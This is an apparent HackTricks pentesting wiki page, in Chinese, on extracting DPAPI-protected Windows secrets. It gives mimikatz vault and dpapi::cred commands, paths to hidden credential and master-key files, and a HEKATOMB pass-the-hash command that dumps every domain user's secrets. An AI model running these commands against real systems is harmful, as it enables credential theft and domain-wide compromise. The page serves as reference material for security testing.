# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}

## 什么是 DPAPI

数据保护 API (DPAPI) 主要用于 Windows 操作系统中 **对称加密非对称私钥**，利用用户或系统秘密作为重要的熵来源。这种方法简化了开发人员的加密工作，使他们能够使用从用户登录秘密派生的密钥进行数据加密，或者在系统加密中使用系统的域认证秘密，从而免去开发人员自己管理加密密钥保护的需要。

### DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Internet Explorer 和 Google Chrome 的密码和自动完成数据
- 应用程序（如 Outlook 和 Windows Mail）的电子邮件和内部 FTP 账户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 和各种加密与认证目的的私钥密码
- 由凭据管理器管理的网络密码以及使用 CryptProtectData 的应用程序中的个人数据，如 Skype、MSN messenger 等

## 列表 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 凭据文件

**受保护的凭据文件**可能位于：
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
使用 mimikatz `dpapi::cred` 获取凭据信息，在响应中可以找到有趣的信息，例如加密数据和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
您可以使用 **mimikatz module** `dpapi::cred` 和适当的 `/masterkey` 进行解密：
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 主密钥

用于加密用户 RSA 密钥的 DPAPI 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录下，其中 {SID} 是该用户的 [**安全标识符**](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥存储在同一文件中**。它通常是 64 字节的随机数据。（请注意，此目录受到保护，因此您无法使用 `dir` 从 cmd 列出它，但您可以从 PS 列出它）。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
这是一组用户的主密钥的样子：

![](<../../images/image (1121).png>)

通常**每个主密钥是一个加密的对称密钥，可以解密其他内容**。因此，**提取** **加密的主密钥**是有趣的，以便**稍后解密**用它加密的**其他内容**。

### 提取主密钥并解密

查看帖子 [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) 以获取提取主密钥并解密的示例。

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) 是[@gentilkiwi](https://twitter.com/gentilkiwi)的[Mimikatz](https://github.com/gentilkiwi/mimikatz/)项目中一些DPAPI功能的C#移植。

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动提取LDAP目录中所有用户和计算机的工具，并通过RPC提取域控制器备份密钥。然后，脚本将解析所有计算机的IP地址，并在所有计算机上执行smbclient以检索所有用户的所有DPAPI blob，并使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从LDAP提取的计算机列表，您可以找到每个子网络，即使您不知道它们！

“因为域管理员权限还不够。黑掉他们所有。”

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储受DPAPI保护的秘密。

## 参考

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
